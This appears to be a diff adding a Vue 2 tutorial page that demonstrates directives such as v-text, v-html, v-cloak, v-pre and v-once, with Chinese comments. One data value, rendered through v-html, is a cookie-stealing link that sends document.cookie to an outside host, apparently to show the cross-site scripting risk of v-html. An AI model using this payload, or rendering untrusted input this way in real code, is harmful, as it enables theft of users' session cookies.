@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Title</title>
+    <script src="../../resource/js/vue.js"></script>
+    <style>
+        [v-cloak]{display: none}
+    </style>
+</head>
+<body>
+<!--
+    学过的
+    v-bind  :   单向绑定解析表达式，简写为 :xx
+    v-model :   双向绑定数据
+    v-for   :   遍历数组/对象/字符串
+    v-on    :   绑定事件监听，简写为 @
+    v-if    :   条件渲染（鼎泰控制节点是否存在）
+    v-else  :   条件渲染（鼎泰控制节点是否存在）
+    v-show  :   条件渲染（鼎泰控制节点是否展示）
+-->
+<!--准备好一个容器-->
+<div id="demo">
+    <h3>{{name}}</h3>
+    <h3 v-cloak>{{name}}</h3>
+    <h3 v-text="name"></h3>
+    <div v-html="htmlStr"></div>
+    <div v-html="htmlStr2"></div>
+    <h3 v-pre>这里不读取动态内容，加上后不再解析{{n}}</h3>
+    <h3 v-once>初始n是{{n}}</h3>
+    <h3>当前n是{{n}}</h3>
+    <button @click="n++">点我n+1</button>
+</div>
+<script>
+    new Vue({
+        el:'#demo',
+        data:{
+            name:'张三',
+            n: 12,
+            htmlStr: '<h3>你好啊</h3>',
+            htmlStr2: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>你好啊</a>'
+        }
+    });
+</script>
+<script>
+    Vue.config.productionTip = false;
+</script>
+</body>
+</html>
